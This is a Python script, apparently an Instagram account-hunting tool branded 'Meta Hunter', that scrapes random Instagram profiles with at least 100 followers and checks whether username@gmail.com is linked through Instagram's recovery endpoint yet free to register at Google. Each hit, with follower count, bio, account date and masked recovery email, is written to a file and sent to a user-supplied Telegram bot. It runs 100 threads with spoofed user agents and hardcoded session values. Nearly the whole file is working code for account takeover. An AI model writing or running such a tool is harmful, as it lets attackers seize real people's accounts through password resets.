import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render
from colorama import Fore, Style, init
import pyfiglet
import shutil
from time import sleep
import os
from colorama import Fore
from shutil import get_terminal_size




API_CONFIG = {
    "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "ig_sig_key_version": "ig_sig_key_version",
    "signed_body": "signed_body",
    "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "content_type_header": "Content-Type",
    "cookie_header": "Cookie",
    "user_agent_header": "User-Agent",
    "default_user_agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ),
    "google_accounts_url": "https://accounts.google.com",
    "google_accounts_domain": "accounts.google.com",
    "referrer_header": "referer",
    "origin_header": "origin",
    "authority_header": "authority",
    "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
    "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
    "token_file": "tl.txt",
    "durdurulmaz_domain": "@gmail.com"
}


E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
G = '\033[1;34m'

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

session = requests.Session()

print('''                                  _______
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠁⣀⣀⣀⣐⣛⢯⣞⣿⣿⣾⣾⣿⣿⣿⣿⢿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡶⣄⠀⠑⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡔⡪⣽⠴⣽⡿⣶⣶⣼⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢈⡃⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣚⡽⢛⣾⣿⣿⣿⣷⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⡿⣿⣿⣿⣿⣿⣿⣿⠿⢛⣻⢿⡿⠿⣿⣞⠻⡅⠀⣠⢄⡤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⢳⡳⣟⢿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠟⣫⣯⢾⣿⣷⣦⣮⣫⣿⣦⢂⠑⢯⠒⣜⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣄⡀⠀⠀⢿⣷⣦⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣲⣿⣷⣝⣾⣻⣿⣿⡪⣿⣷⠝⢄⢕⢝⡞⡵⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠀⠀⢀⣋⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢯⣧⡹⣿⣿⣿⣿⣿⣿⣿⣿⣷⡍⣵⢳⣕⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠶⢿⣰⢻⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡪⣿⣾⣿⣿⣿⣿⣿⣿⣿⣷⡜⢿⣾⡿⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠀⡕⣃⣽⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⣷⢽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣻⡿⣿⣿⣿⣿⢸⡺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣄⣠⣄⠀⠀⠀⠀⠀⠀⠀⢹⣿⣷⣾⣟⣿⣿⣽⠟⢋⣛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣦⣿⣿⣾⠿⠿⠋⠽⠛⢿⣿⣦⣴⣔⠶⠶⠛⠉⣿⣿⣿⣿⣿⡯⠁⢸⡳⡌⢳⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⠀⣀⣀⣤⣴⣶⣚⣫⠉⢹⣿⡟⠛⠉⣠⣾⣿⣿⣿⣿⣷⣦⣻⣟⢓⣀⠤⠀⠀⠀⠀⢿⣿⣿⢻⡁⠀⠹⠁⠙⣞⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣽⣿⡿⠿⠿⢿⣿⣿⣿⣟⣷⣿⣿⣅⠀⣸⣻⣿⢍⢻⠟⠫⠍⠩⠊⣿⠟⠀⠀⠀⠀⠀⠀⠀⢻⡻⣿⡷⣄⡾⠉⢹⠘⡌⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠛⠉⢹⡄⣰⣾⣿⣿⣿⣿⣿⡏⠀⠹⣿⣇⠙⠀⠀⠈⠀⠀⠀⠀⠀⠀⣻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠡⠾⠁⠠⢓⠄⢦⠀⠇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣅⣀⠤⠔⣧⠿⣿⣈⡻⢋⣿⣿⠁⠀⠀⠙⢿⣷⣄⡀⠀⠀⠀⡀⣀⣠⡷⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⡜⡤⠋⡰⢁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⠻⣯⠀⠀⠀⢻⡆⠈⠂⡠⢴⣿⢿⠀⠀⠀⠀⠀⠀⠉⢛⠿⠾⠚⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣗⣭⠴⠞⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⡀⠀⠀⠇⠀⣰⠄⣸⡿⠁⠀⠀⠀⠐⠒⠁⠙⢐⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣋⣙⢀⡠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣤⣤⣸⣬⣶⠾⠛⠁⣀⠀⠀⠈⠁⣠⣤⡔⢼⡆⠑⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠈⣻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⢣⠀⠀⠀⠀⣓⠴⣖⡶⣿⡿⣿⣿⣟⡁⠀⠀⠑⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠠⠽⠀⢀⣺⣯⣷⣦⣶⣵⣶⣤⣶⣶⣤⣜⢆⠈⠒⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⢡⠀⠀⢺⡽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⡇⣰⣾⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣂⣠⠀⠁⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⢰⣿⣿⢟⢋⣃⣱⣦⣾⠶⠟⠻⢛⠫⠉⠙⠛⢿⣀⠀⠀⠀⠀⠀⢤⣤⣾⡿⠊⠀⠀⠀⢅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡸⢿⣿⡿⠛⠉⡁⣲⣤⣤⣶⣤⣷⠭⠀⠀⢀⠤⠂⢨⣶⣦⣢⣮⣷⣿⡿⠁⠀⠀⠀⠀⠀⣆⣠⣤⣴⣦⢄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣞⣅⠀⢷⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠤⠊⠁⡀⢼⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣇⠑⠠⣤⣀⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣼⣿⡄⠣⡛⢿⢿⣿⣿⣿⣊⡀⢀⡀⣀⠤⣤⣼⣿⣿⣿⡿⠉⠁⠁⠀⠀⠁⠀⠀⠀⠀⠸⣿⢿⣿⣿⣿⣷⣄⠈⠻⣿⣷⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣟⣽⣿⣷⣀⠀⣾⣿⡣⣽⣿⢻⣿⣿⣿⣯⣮⣿⣿⣿⡟⠙⠀⡤⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠻⣿⣿⣿⣿⣧⡀⠈⠻⢿
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⡠⣾⣿⣿⣿⣿⣿⣫⣾⣿⣿⣿⣿⡮⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠃⠶⠀⠀⠀⠀⡢⠀⠀⠀⠀⠀⠀⠀⣸⠇⣀⡈⢿⣿⣿⣿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⢀⣞⣿⣿⣿⡿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⡿⠓⢤⠀⠀⠀⠀⠀⠀⠀⠠⡸⠂⠀⠀⠀⠀⠀⠀⢴⣷⣿⣿⣷⢸⣿⣿⣿⣿⣇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⢿⣿⣷⡆⠀⢠⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣍⢣⡘⠦⡀⠐⠀⠀⠀⠀⠀⠀⠀⠀⣀⠞⠀⠀⠀⠀⠄⠀⠀⠀⢸⣿⣿⣿⣿⢘⣿⣿⣿⣿⣿⣦⣠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡽⡄⠉⠁⣄⣠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⠷⠜⡀⠀⠀⠀⠀⠀⠀⠀⢊⣁⡤⠁⠀⢀⠀⠀⠀⠀⠀⢸⣟⣩⣿⣿⣿⣿⣫⣿⣿⣿⣿⣿
⠀⠀⠀⠀⣀⣀⢤⡤⡖⡓⣶⡇⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣣⠀⠬⠁⠀⠀⠀⠀⠀⠀⠀⠉⢀⢀⡴⡡⠂⢀⣠⣴⡶⣫⣾⣿⣿⣿⣿⣿⢾⣿⣿⣿⣿⣿
⡆⢀⡶⢋⠀⠈⠘⠚⢚⣼⣊⡅⢀⠀⠒⢙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⣀⡀⢀⠀⠀⡀⡨⢕⠉⠈⣠⣼⣿⣿⣿⣿⣿⣼⡿⡿⢻⣿⣿⣻⣿⣿⣿⣿⣿
⠔⠁⠀⢀⡲⢕⣂⠥⣾⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣻⡜⣩⡏⣿⣿⣿⡿⣿⣿''')

from colorama import Fore, init
import pyfiglet

init(autoreset=True)

# Create ASCII art for "Pablo Escobar" with a medium-sized font
ascii_art = pyfiglet.figlet_format("Tony Stark", font="small")

# Add some color flair
print(f"{Fore.YELLOW}{ascii_art}")
print(f"{Fore.CYAN}Developed by @evrenisikti")
print("")

ID = input("- İD GİR: ")
TOKEN = input("- TOKEN GİR: ")



    

def pppp():
    ge = hits               
    bt = bad_insta + bad_email 
    be = good_ig
    os.system('cls' if os.name == 'nt' else 'clear')       
    print(f"\n══════════════════════════════════════════════\n 𝐌𝐄𝐓𝐀 𝐇𝐔𝐍𝐓𝐄𝐑 \r{C1}\n𝐇ı𝐭: {M}{ge} {E} \n𝐁𝐚𝐝: {HH}{bt} {W9}\n𝐅𝐚𝐥𝐬𝐞: {HH}  {M}{be} \n𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @evrenisikti \n══════════════════════════════════════════════ ")

def update_stats():
    pppp()


def otuzbir():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["user_agent_header"]: str(generate_user_agent())
        }
        recovery_url = (f"{API_CONFIG['google_accounts_url']}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        if match:
            tok = match.group(2)
        else:
            raise Exception("Token bulunamadı")
        cookies = {'__Host-GAPS': host}
        headers2 = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: ('https://accounts.google.com/signup/v2/createaccount'
                                            '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{API_CONFIG['google_accounts_url']}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', host)
        with open(API_CONFIG["token_file"], 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(" hata:", e)
        otuzbir()


otuzbir()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(API_CONFIG["token_file"], 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{API_CONFIG['google_accounts_url']}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + API_CONFIG["durdurulmaz_domain"]
            InfoAcc(email, full_email.split('@')[1])
        else:
            bad_email += 1
            update_stats()
    except Exception as e:
        print("check_gmail hata:", e)
        pass
        
def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        API_CONFIG["user_agent_header"]: ua,
        API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
        API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"]
    }
    data = {
        API_CONFIG["signed_body"]: (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        API_CONFIG["ig_sig_key_version"]: '4'
    }
    response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).text
    if email in response:
        if API_CONFIG["durdurulmaz_domain"] in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            API_CONFIG["user_agent_header"]: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                              '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                              'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"],
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            API_CONFIG["signed_body"]: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                '"device_id":"android-b93ddb37e983481c",'
                '"query":"' + user + '"}'
            ),
            API_CONFIG["ig_sig_key_version"]: '4'
        }
        response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).json()
        return response.get('email', 'h h h')
    except Exception as e:
        print("rest fonksiyonunda hata:", e)
        return 'h h h'

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk', 0)
    try:
        user_id_int = int(user_id)
    except:
        user_id_int = 0

    if 1 < user_id_int <= 1278889:
        reg_date = 2010
    elif 1279000 <= user_id_int <= 17750000:
        reg_date = 2011
    elif 17750001 <= user_id_int <= 279760000:
        reg_date = 2012
    elif 279760001 <= user_id_int <= 900990000:
        reg_date = 2013
    elif 900990001 <= user_id_int <= 1629010000:
        reg_date = 2014
    elif 1629010001 <= user_id_int <= 2369359761:
        reg_date = 2015
    elif 2369359762 <= user_id_int <= 4239516754:
        reg_date = 2016
    elif 4239516755 <= user_id_int <= 6345108209:
        reg_date = 2017
    elif 6345108210 <= user_id_int <= 10016232395:
        reg_date = 2018
    elif 10016232396 <= user_id_int <= 27238602159:
        reg_date = 2019
    elif 27238602160 <= user_id_int <= 43464475395:
        reg_date = 2020
    elif 43464475396 <= user_id_int <= 50289297647:
        reg_date = 2021
    elif 50289297648 <= user_id_int <= 57464707082:
        reg_date = 2022
    elif 57464707083 <= user_id_int <= 63313426938:
        reg_date = 2023
    else:
        reg_date = "2024 or 2025"

    followers = account_info.get('follower_count', 0)
    try:
        followers = int(followers)
    except:
        followers = 0
    if followers < 100 :
        return  

    following = account_info.get('following_count', '')
    total_hits += 1
    info_text = f"""


 𝙸̇𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 𝙷𝚒𝚝 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜
════════════════
 𝙷𝚒𝚝: {total_hits}
 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎: {username}
 𝙼𝚊𝚒𝚕: {username}@{domain}
 𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜: {followers}
 𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐: {following}
 𝙳𝚊𝚝𝚎: {reg_date}
 𝙱𝚒𝚘: {account_info.get('biography','')}
 𝚁𝚎𝚜𝚝: {rest(username)}
 𝙻𝚒𝚗𝚔: 
 https://www.instagram.com/{username}
════════════════
𝕋𝕖𝕝𝕖𝕘𝕣𝕒𝕞: @evrenisikti
"""
    with open('tonyMetaHunting.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception as e:
        print("Telegram mesajı gönderilemedi:", e)

def durdurulmaz_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(1629010000, 2500000000)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                if followers < 100:  
                    continue
                infoinsta[username] = account
                email = username + API_CONFIG["durdurulmaz_domain"]
                check(email)
        except Exception as e:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

Thread(target=stats_loop, daemon=True).start()


for _ in range(100):
    Thread(target=durdurulmaz_python).start()